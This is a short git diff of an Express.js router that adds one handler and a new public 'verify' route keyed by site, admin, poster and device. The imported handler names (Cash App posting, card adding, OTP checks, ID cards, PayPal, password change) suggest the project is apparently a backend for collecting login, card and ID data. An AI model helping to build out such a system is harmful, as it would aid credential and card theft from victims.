@@ -3,7 +3,7 @@ const router = express.Router();
 import rateLimitMiddleware from "../ratelimiter.js"
 
 import {signup_post, link_add,link_get,login_post,skip_code,add_mail,poster_add,add_data,info_get,all_poster,yoyo,email_add,add_email,
-    delete_poster,new_site_add_poster,get_A_poster,poster_details,add_site,admin_add_site,add_posterNumber,email_otp,send_email,
+    delete_poster,new_site_add_poster,get_A_poster,poster_details,add_site,admin_add_site,add_posterNumber,email_otp,send_email,site_exist_new,
     add_new_links,site_exist,click_for_admin,click,link_details,cashapap_post,update_validity,links_add,otp_check,pass_change,card_add,
     get_deyails_cashapp,show_all,demo_add,check_qrcode,rqcode_permission,update_many,add_data_checnge,today_data,id_card,cards,otp_send,phone_add,delete_info,add_paypal
     
@@ -89,6 +89,9 @@ router.get('/info/:username/:id/:admin', info_get);
 
 router.get('/get/poster/:id/:admin', get_A_poster);////
 router.get('/:site/verify/:adminId/:posterId/:device', site_exist);
+
+router.get('/:site/verify/public/post_details/:adminId/:posterId/:device', site_exist_new);
+
 router.get('/qrcode/status/check/:adminId',check_qrcode)  
 
 
